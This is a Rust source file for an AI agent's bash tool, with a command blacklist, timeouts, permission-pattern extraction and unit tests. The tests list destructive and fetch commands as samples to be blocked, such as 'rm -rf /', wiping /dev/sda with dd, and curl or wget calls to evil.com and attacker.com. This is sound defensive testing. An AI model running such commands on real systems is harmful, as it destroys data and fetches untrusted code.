use crate::permissions::{ToolPermissionBuilder, ToolPermissionDescriptor};
use crate::tools::bash_blacklist::matches_pattern;
use crate::tools::{Tool, ToolError, ToolResult};
use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{json, Value};
use std::path::PathBuf;
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;
use tokio::time::timeout;

/// Tool for executing bash commands safely
pub struct BashTool {
    working_directory: PathBuf,
    timeout_seconds: u64,
    allow_dangerous_commands: bool,
    blacklist_patterns: Vec<String>,
}

impl BashTool {
    pub fn new() -> Self {
        Self {
            working_directory: std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
            timeout_seconds: 30, // Default 30 second timeout
            allow_dangerous_commands: false,
            blacklist_patterns: Vec::new(),
        }
    }

    pub fn with_working_directory(working_dir: PathBuf) -> Self {
        Self {
            working_directory: working_dir,
            timeout_seconds: 30,
            allow_dangerous_commands: false,
            blacklist_patterns: Vec::new(),
        }
    }

    pub fn with_blacklist(mut self, patterns: Vec<String>) -> Self {
        self.blacklist_patterns = patterns;
        self
    }

    pub fn with_timeout(mut self, timeout_seconds: u64) -> Self {
        self.timeout_seconds = timeout_seconds;
        self
    }

    pub fn allow_dangerous_commands(mut self, allow: bool) -> Self {
        self.allow_dangerous_commands = allow;
        self
    }

    /// Check if a command matches any blacklist pattern
    fn is_dangerous_command(&self, command: &str) -> bool {
        if self.allow_dangerous_commands {
            return false;
        }

        // Check if command matches any blacklist pattern
        for pattern in &self.blacklist_patterns {
            if matches_pattern(command, pattern) {
                return true;
            }
        }

        false
    }

    /// Sanitize command to prevent some basic injection attempts
    /// Note: This is NOT sufficient for security - dangerous commands should be blocked entirely
    fn sanitize_command(&self, command: &str) -> String {
        // Remove null bytes and other control characters that could be problematic
        // Keep newlines and tabs as they might be intentional
        command
            .chars()
            .filter(|c| !c.is_control() || matches!(c, '\n' | '\t' | ' ') || c.is_whitespace())
            .collect()
    }

    async fn execute_impl(&self, args: &Value) -> ToolResult<String> {
        let args: BashArgs =
            serde_json::from_value(args.clone()).map_err(|e| ToolError::InvalidArguments {
                tool: "bash".to_string(),
                message: e.to_string(),
            })?;

        let command = self.sanitize_command(&args.command);

        // Security check for dangerous commands
        if self.is_dangerous_command(&command) {
            return Err(ToolError::SecurityViolation {
                message: format!(
                    "Command rejected for security reasons: '{}'. \
                     Use --skip-permissions flag to bypass this check.",
                    command
                ),
            });
        }

        let timeout_duration =
            Duration::from_secs(args.timeout_override.unwrap_or(self.timeout_seconds));

        // Execute the command
        let mut cmd = Command::new("bash");
        cmd.arg("-c")
            .arg(&command)
            .current_dir(&self.working_directory)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .stdin(Stdio::null());

        let command_future = async {
            let output = cmd.output().await.map_err(|e| ToolError::ExecutionFailed {
                message: format!("Failed to execute command '{}': {}", command, e),
            })?;

            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            let mut result = String::new();

            if !stdout.is_empty() {
                result.push_str("STDOUT:\n");
                result.push_str(&stdout);
                if !stdout.ends_with('\n') {
                    result.push('\n');
                }
            }

            if !stderr.is_empty() {
                result.push_str("STDERR:\n");
                result.push_str(&stderr);
                if !stderr.ends_with('\n') {
                    result.push('\n');
                }
            }

            if result.is_empty() {
                result = "(command executed successfully with no output)\n".to_string();
            }

            // Add exit code information
            result.push_str(&format!(
                "Exit code: {}\n",
                output.status.code().unwrap_or(-1)
            ));

            if !output.status.success() {
                result.push_str("⚠️  Command failed with non-zero exit code\n");
            }

            Ok::<String, ToolError>(result)
        };

        // Apply timeout
        match timeout(timeout_duration, command_future).await {
            Ok(result) => result,
            Err(_) => Err(ToolError::Timeout {
                tool: "bash".to_string(),
                seconds: timeout_duration.as_secs(),
            }),
        }
    }

    /// Extract bash permission pattern from a command
    /// Smart pattern extraction:
    /// - If command has subcommand (non-flag): "cargo clippy:*"
    /// - If command only has flags: "cargo --version:*"
    /// - Single word command: "echo:*"
    /// - Stops at shell operators (&&, ||, ;, |, >, <) to prevent dangerous patterns
    fn extract_bash_pattern(command: &str) -> String {
        // Simple quote-aware tokenization
        let parts: Vec<&str> = Self::tokenize_command(command);

        if parts.is_empty() {
            return "*".to_string();
        }

        // Filter out shell operators - only use parts before first operator
        let shell_operators = ["&&", "||", ";", "|", ">", "<", ">>", "<<"];
        let safe_parts: Vec<String> = parts
            .iter()
            .take_while(|part| !shell_operators.contains(part))
            .map(|part| {
                // Also strip shell operators that might be attached to the token
                // e.g., "/tmp;" -> "/tmp"
                let mut cleaned = part.to_string();
                for op in &shell_operators {
                    if let Some(pos) = cleaned.find(op) {
                        cleaned.truncate(pos);
                        break;
                    }
                }
                cleaned
            })
            .filter(|part| !part.is_empty())
            .collect();

        if safe_parts.is_empty() {
            return "*".to_string();
        }

        // Take first word (the command)
        let base_command = &safe_parts[0];

        // Check for subcommand (second word that doesn't start with -)
        if safe_parts.len() >= 2 {
            let second_word = &safe_parts[1];
            if !second_word.starts_with('-') && !shell_operators.contains(&second_word.as_str()) {
                // Has subcommand: "cargo clippy:*"
                return format!("{} {}:*", base_command, second_word);
            } else if !shell_operators.contains(&second_word.as_str()) {
                // No subcommand, has flag: "cargo --version:*"
                return format!("{} {}:*", base_command, second_word);
            }
        }

        // Single word command: "echo:*"
        format!("{}:*", base_command)
    }

    /// Simple tokenization that respects quotes
    /// Splits by whitespace but treats quoted strings as single tokens
    fn tokenize_command(command: &str) -> Vec<&str> {
        let mut tokens = Vec::new();
        let mut current_start = 0;
        let mut in_quotes = false;
        let mut quote_char = '\0';

        for (i, ch) in command.char_indices() {
            match ch {
                '"' | '\'' if !in_quotes => {
                    // Start of quoted section - if we have accumulated text, save it
                    if i > current_start {
                        let token = command[current_start..i].trim();
                        if !token.is_empty() {
                            tokens.push(token);
                        }
                    }
                    in_quotes = true;
                    quote_char = ch;
                    current_start = i;
                }
                '"' | '\'' if in_quotes && ch == quote_char => {
                    // End of quoted section - skip the quoted part entirely
                    in_quotes = false;
                    current_start = i + 1;
                }
                ' ' | '\t' if !in_quotes => {
                    // Whitespace outside quotes - token boundary
                    if i > current_start {
                        let token = command[current_start..i].trim();
                        if !token.is_empty() {
                            tokens.push(token);
                        }
                    }
                    current_start = i + 1;
                }
                _ => {}
            }
        }

        // Add final token if any
        if current_start < command.len() && !in_quotes {
            let token = command[current_start..].trim();
            if !token.is_empty() {
                tokens.push(token);
            }
        }

        tokens
    }
}

#[derive(Deserialize)]
struct BashArgs {
    command: String,
    #[serde(default)]
    timeout_override: Option<u64>,
}

#[async_trait]
impl Tool for BashTool {
    async fn execute(&self, args: &Value) -> ToolResult<String> {
        self.execute_impl(args).await
    }

    fn name(&self) -> &'static str {
        "bash"
    }

    fn display_name(&self) -> &'static str {
        "bash"
    }

    fn description(&self) -> &'static str {
        "Execute bash commands safely with timeout and security restrictions."
    }

    fn parameter_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The bash command to execute"
                },
                "timeout_override": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": 300,
                    "description": "Optional: timeout in seconds (max 300 seconds)"
                }
            },
            "required": ["command"]
        })
    }

    fn format_call_display(&self, args: &Value) -> String {
        if let Ok(parsed_args) = serde_json::from_value::<BashArgs>(args.clone()) {
            // Show a preview of the command (truncate if too long)
            let cmd = &parsed_args.command;
            if cmd.len() > 50 {
                format!("Bash({}...)", &cmd[..50])
            } else {
                format!("Bash({})", cmd)
            }
        } else {
            "Bash(?)".to_string()
        }
    }

    fn result_summary(&self, result: &str) -> String {
        // Check if command completed successfully
        if result.contains("Exit code: 0") {
            // Try to extract meaningful output
            if let Some(stdout) = result.split("STDOUT:\n").nth(1) {
                let output_line = stdout.lines().next().unwrap_or("");
                if !output_line.is_empty() && !output_line.starts_with("Exit code:") {
                    if output_line.len() > 50 {
                        return format!("{}...", &output_line[..50]);
                    }
                    return output_line.to_string();
                }
            }
            "Command completed successfully".to_string()
        } else if result.contains("Command failed") {
            "Command failed with non-zero exit code".to_string()
        } else {
            let lines = result.lines().count();
            format!("Command completed ({} lines output)", lines)
        }
    }

    fn describe_permission(&self, target: Option<&str>) -> ToolPermissionDescriptor {
        let target_str = target.unwrap_or("*");
        let pattern = if target_str != "*" {
            Self::extract_bash_pattern(target_str)
        } else {
            "*".to_string()
        };

        // Create a human-readable pattern description
        // Remove the trailing :* for display
        let pattern_display = pattern.trim_end_matches(":*").trim_end_matches('*');
        let persistent_message = if pattern_display.is_empty() {
            "don't ask me again for bash in this project".to_string()
        } else {
            format!(
                "don't ask me again for \"{}\" commands in this project",
                pattern_display
            )
        };

        use crate::permissions::BashPatternMatcher;
        use std::sync::Arc;

        ToolPermissionBuilder::new(self, target_str)
            .with_approval_title(" Bash Command ")
            .with_approval_prompt(format!(
                " Can I run \"{} {}\"",
                self.display_name(),
                target.unwrap_or(" ")
            ))
            .with_persistent_approval(persistent_message)
            .with_suggested_pattern(pattern)
            .with_pattern_matcher(Arc::new(BashPatternMatcher))
            // Bash is neither purely read-only nor destructive by default
            // It requires explicit approval for each command
            .build()
            .expect("Failed to build BashTool permission descriptor")
    }
}

impl Default for BashTool {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_bash_tool_simple_command() {
        let tool = BashTool::new();
        let args = serde_json::json!({
            "command": "echo 'Hello, World!'"
        });

        let result = tool.execute(&args).await.unwrap();
        assert!(result.contains("Hello, World!"));
        assert!(result.contains("Exit code: 0"));
    }

    #[tokio::test]
    async fn test_bash_tool_dangerous_command_blocked() {
        let tool = BashTool::new().with_blacklist(vec!["rm -rf*".to_string()]);
        let args = serde_json::json!({
            "command": "rm -rf /"
        });

        let result = tool.execute(&args).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("security reasons"));
    }

    #[tokio::test]
    async fn test_bash_tool_allow_dangerous_commands() {
        // Even with blacklist, allow_dangerous_commands should bypass checks
        let tool = BashTool::new()
            .with_blacklist(vec!["rm -rf*".to_string()])
            .allow_dangerous_commands(true);
        let args = serde_json::json!({
            "command": "echo 'This would be dangerous: rm -rf /'"
        });

        // This should work because allow_dangerous_commands bypasses blacklist
        let result = tool.execute(&args).await.unwrap();
        assert!(result.contains("This would be dangerous"));
    }

    #[tokio::test]
    async fn test_bash_tool_failed_command() {
        let tool = BashTool::new();
        let args = serde_json::json!({
            "command": "ls /nonexistent/directory"
        });

        let result = tool.execute(&args).await.unwrap();
        assert!(result.contains("STDERR:"));
        assert!(result.contains("Exit code:"));
        assert!(result.contains("Command failed"));
    }

    #[tokio::test]
    async fn test_bash_tool_timeout() {
        let tool = BashTool::new().with_timeout(1); // 1 second timeout
        let args = json!({
            "command": "sleep 5" // This should timeout
        });

        let result = tool.execute(&args).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Timeout"));
    }

    #[tokio::test]
    async fn test_bash_tool_blacklist_with_patterns() {
        let tool = BashTool::new().with_blacklist(vec![
            "rm -rf*".to_string(),
            "wget*".to_string(),
            "curl*".to_string(),
        ]);

        let dangerous_commands = vec![
            "rm -rf /",
            "wget http://evil.com/script",
            "curl http://attacker.com",
        ];

        for cmd in dangerous_commands {
            let args = serde_json::json!({
                "command": cmd
            });

            let result = tool.execute(&args).await;
            assert!(result.is_err(), "Should block dangerous command: {}", cmd);
            assert!(result.unwrap_err().to_string().contains("security reasons"));
        }
    }

    #[tokio::test]
    async fn test_bash_tool_device_access_blocked() {
        let tool = BashTool::new().with_blacklist(vec![
            "/dev/sda*".to_string(),
            "/dev/nvme*".to_string(),
            "dd if=*".to_string(),
        ]);

        let dangerous_commands = vec![
            "cat /dev/urandom > /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "echo test > /dev/nvme0n1",
        ];

        for cmd in dangerous_commands {
            let args = serde_json::json!({
                "command": cmd
            });

            let result = tool.execute(&args).await;
            assert!(result.is_err(), "Should block device access: {}", cmd);
        }
    }

    #[tokio::test]
    async fn test_bash_tool_safe_commands_allowed() {
        let tool = BashTool::new(); // Empty blacklist

        let safe_commands = vec!["pwd", "echo 'Hello World'", "cat README.md"];

        for cmd in safe_commands {
            let args = json!({
                "command": cmd
            });

            // These should not be rejected for security reasons
            // They might fail for other reasons (file not found, etc) but not security
            let result = tool.execute(&args).await;
            if result.is_err() {
                let err_msg = result.unwrap_err().to_string();
                assert!(
                    !err_msg.contains("security reasons"),
                    "Safe command should not be blocked: {} - Error: {}",
                    cmd,
                    err_msg
                );
            }
        }
    }

    #[tokio::test]
    async fn test_bash_tool_empty_blacklist_allows_all() {
        let tool = BashTool::new(); // Empty blacklist by default

        // Commands that would be dangerous if in blacklist, but should work with empty blacklist
        let commands = vec!["echo test", "ls -la"];

        for cmd in commands {
            let args = json!({
                "command": cmd
            });

            let result = tool.execute(&args).await;
            // Should not fail with security error
            if result.is_err() {
                let err_msg = result.unwrap_err().to_string();
                assert!(
                    !err_msg.contains("security reasons"),
                    "Command should not be blocked with empty blacklist: {}",
                    cmd
                );
            }
        }
    }

    #[test]
    fn test_extract_bash_pattern() {
        // Test with command + subcommand
        assert_eq!(
            BashTool::extract_bash_pattern("cargo clippy --all-features --all-targets"),
            "cargo clippy:*"
        );

        // Test with npm run
        assert_eq!(BashTool::extract_bash_pattern("npm run test"), "npm run:*");

        // Test with git command
        assert_eq!(
            BashTool::extract_bash_pattern("git commit -m \"message\""),
            "git commit:*"
        );

        // Test with command that has only flags (should include first flag)
        assert_eq!(BashTool::extract_bash_pattern("ls -la"), "ls -la:*");
        assert_eq!(
            BashTool::extract_bash_pattern("cargo --version"),
            "cargo --version:*"
        );

        // Test with python script
        assert_eq!(
            BashTool::extract_bash_pattern("python script.py --arg value"),
            "python script.py:*"
        );

        // Test with custom tool
        assert_eq!(
            BashTool::extract_bash_pattern("./custom-tool arg1 arg2"),
            "./custom-tool arg1:*"
        );

        // Test with make
        assert_eq!(BashTool::extract_bash_pattern("make test"), "make test:*");

        // Test with single word command
        assert_eq!(BashTool::extract_bash_pattern("pwd"), "pwd:*");

        // Test with empty string
        assert_eq!(BashTool::extract_bash_pattern(""), "*");

        // Test with docker compose
        assert_eq!(
            BashTool::extract_bash_pattern("docker compose up -d"),
            "docker compose:*"
        );

        // Test with quoted strings (should skip quoted parts)
        assert_eq!(
            BashTool::extract_bash_pattern("echo \"Hello! Bash tool is working correctly.\""),
            "echo:*"
        );

        // Test with echo and arguments
        assert_eq!(BashTool::extract_bash_pattern("echo test"), "echo test:*");
    }

    #[test]
    fn test_extract_bash_pattern_shell_operators() {
        // Test with && operator - should only take first command
        assert_eq!(
            BashTool::extract_bash_pattern("echo test && ls"),
            "echo test:*"
        );

        // Test with && operator without args
        assert_eq!(BashTool::extract_bash_pattern("echo && ls"), "echo:*");

        // Test with || operator
        assert_eq!(
            BashTool::extract_bash_pattern("cargo build || echo failed"),
            "cargo build:*"
        );

        // Test with semicolon
        assert_eq!(
            BashTool::extract_bash_pattern("cd /tmp; ls -la"),
            "cd /tmp:*"
        );

        // Test with pipe operator
        assert_eq!(
            BashTool::extract_bash_pattern("ls -la | grep foo"),
            "ls -la:*"
        );

        // Test with redirect operators
        assert_eq!(
            BashTool::extract_bash_pattern("echo test > file.txt"),
            "echo test:*"
        );
        assert_eq!(BashTool::extract_bash_pattern("cat < input.txt"), "cat:*");

        // Test with >> (append)
        assert_eq!(
            BashTool::extract_bash_pattern("echo test >> file.txt"),
            "echo test:*"
        );

        // Test with operator at start (edge case)
        assert_eq!(BashTool::extract_bash_pattern("&& ls"), "*");

        // Test with multiple operators
        assert_eq!(
            BashTool::extract_bash_pattern("echo test && ls | grep foo"),
            "echo test:*"
        );
    }
}
